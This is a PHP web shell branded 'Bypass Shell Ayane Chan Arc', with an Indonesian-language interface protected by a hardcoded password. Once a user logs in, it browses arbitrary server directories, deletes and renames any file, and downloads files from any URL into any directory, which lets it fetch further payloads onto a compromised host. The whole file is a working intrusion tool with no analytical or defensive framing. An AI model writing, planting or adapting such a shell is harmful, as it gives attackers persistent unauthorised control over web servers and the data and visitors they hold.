<?php
session_start();

define('PASSWORD', 'ayane111'); // Password untuk kontrol akses

if (isset($_POST['password'])) {
    if ($_POST['password'] === PASSWORD) {
        $_SESSION['authenticated'] = true;
    } else {
        echo "<div class='alert alert-danger text-center'>Password salah.</div>";
    }
}

if (isset($_POST['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
    echo '
    <div class="container mt-5" style="background-color: pink; border-radius: 8px; padding: 20px;">
        <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
        <div class="text-center mb-4">
            <img src="https://i.pinimg.com/564x/79/85/d8/7985d80888988a81764ef03feeaafdfb.jpg" alt="Banner Image" class="img-fluid">
        </div>
        <div class="row justify-content-center">
            <div class="col-md-6">
                <form method="post" class="text-center">
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" class="form-control" placeholder="Masukkan password" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Login</button>
                </form>
            </div>
        </div>
    </div>';
    exit;
}

function uploadFromUrl($url, $saveTo) {
    $fileContent = file_get_contents($url);
    if ($fileContent === FALSE) {
        die('Gagal mengunduh file dari URL');
    }
    file_put_contents($saveTo, $fileContent);
    echo "<div class='alert alert-success'>File berhasil diupload: $saveTo</div>";
}

function display_path_links($dir) {
    if (is_dir($dir)) {
        $folders = [];
        $files = [];

        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;

            if (is_dir($dir . '/' . $item)) {
                $folders[] = $item;
            } else {
                $files[] = $item;
            }
        }

        foreach ($folders as $folder) {
            $folderPath = htmlspecialchars($dir . '/' . $folder);
            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
            echo "<a href='?dir=" . urlencode($folderPath) . "' class='btn btn-link'>$folder/</a>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='path' value='" . htmlspecialchars($dir . '/' . $folder) . "'>";
            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Hapus</button>";
            echo "</form>";
            echo "</div>";
        }

        foreach ($files as $file) {
            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
            echo "<span>$file</span>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='source' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<input type='text' name='destination' class='form-control-sm' placeholder='Nama baru'>";
            echo "<button type='submit' name='rename' class='btn btn-warning btn-sm ml-2'>Ganti Nama</button>";
            echo "</form>";
            echo "<form method='post' style='display:inline;'>";
            echo "<input type='hidden' name='path' value='" . htmlspecialchars($dir . '/' . $file) . "'>";
            echo "<button type='submit' name='delete' class='btn btn-danger btn-sm ml-2'>Hapus</button>";
            echo "</form>";
            echo "</div>";
        }
    } else {
        echo "<div class='alert alert-danger'>Direktori tidak ditemukan.</div>";
    }
}

function deleteItem($path) {
    if (is_dir($path)) {
        rmdir($path);
    } else {
        unlink($path);
    }
    echo "<div class='alert alert-success'>Item berhasil dihapus.</div>";
}

function renameFile($source, $destination) {
    if (rename($source, $destination)) {
        echo "<div class='alert alert-success'>File berhasil diganti namanya.</div>";
    } else {
        echo "<div class='alert alert-danger'>Gagal mengganti nama file.</div>";
    }
}

if (isset($_POST['url']) && isset($_POST['dir'])) {
    $url = $_POST['url'];
    $uploadDir = $_POST['dir'];
    $filename = basename($url);
    $savePath = rtrim($uploadDir, '/') . '/' . $filename;

    uploadFromUrl($url, $savePath);
}

if (isset($_POST['delete']) && isset($_POST['path'])) {
    $path = $_POST['path'];
    deleteItem($path);
}

if (isset($_POST['rename']) && isset($_POST['source']) && isset($_POST['destination'])) {
    $source = $_POST['source'];
    $destination = $_POST['destination'];
    renameFile($source, $destination);
}

$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$displayDir = realpath($dir);

$dirArray = array_filter(explode(DIRECTORY_SEPARATOR, $displayDir), function($val) { return $val !== ''; });
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bypass Shell Ayane Chan Arc</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>
<body style="background-color: pink;">
    <div class="container mt-5">
        <?php if (isset($_SESSION['authenticated']) && $_SESSION['authenticated']): ?>
        <h1 class="mb-4 text-center">Bypass Shell Ayane Chan Arc</h1>
        <div class="text-center mb-4">
            <img src="https://i.pinimg.com/564x/b6/ac/db/b6acdba14a2632ae4bc67088ba0c0422.jpg" alt="Welcome Image" class="img-fluid">
        </div>
        <form method="post" class="text-center mb-4">
            <button type="submit" name="logout" class="btn btn-danger">Logout</button>
        </form>

        <h2 class="mt-4">Upload File ke Direktori Saat Ini</h2>
        <form method="post">
            <div class="form-group">
                <label for="url">URL File</label>
                <input type="text" id="url" name="url" class="form-control" placeholder="Masukkan URL file" required>
            </div>
            <input type="hidden" name="dir" value="<?php echo htmlspecialchars($dir); ?>">
            <button type="submit" class="btn btn-primary">Upload dari URL</button>
        </form>

        <h2 class="mt-4">Daftar Direktori</h2>
        <div class="alert alert-info">
            <strong>Direktori Saat Ini:</strong> 
            <?php
            $currentPath = '/';
            echo "<a href='?dir=' class='btn btn-link'>/</a> ";
            foreach ($dirArray as $index => $folder) {
                $currentPath .= htmlspecialchars($folder) . '/';
                $encodedPath = urlencode($currentPath);
                echo "<a href='?dir=$encodedPath' class='btn btn-link'>" . htmlspecialchars($folder) . "</a>";
                if ($index < count($dirArray) - 1) {
                    echo " / ";
                }
            }
            ?>
        </div>
        <div class="list-group">
            <?php
            display_path_links($dir);
            ?>
        </div>

        <footer class="text-center mt-4">
            <small>&copy; <?php echo date("Y"); ?> Bypass Shell Ayane Chan Arc. Semua hak cipta dilindungi.</small>
        </footer>
        <?php else: ?>
        <!-- Konten halaman login jika belum terautentikasi -->
        <?php endif; ?>
    </div>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.3/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
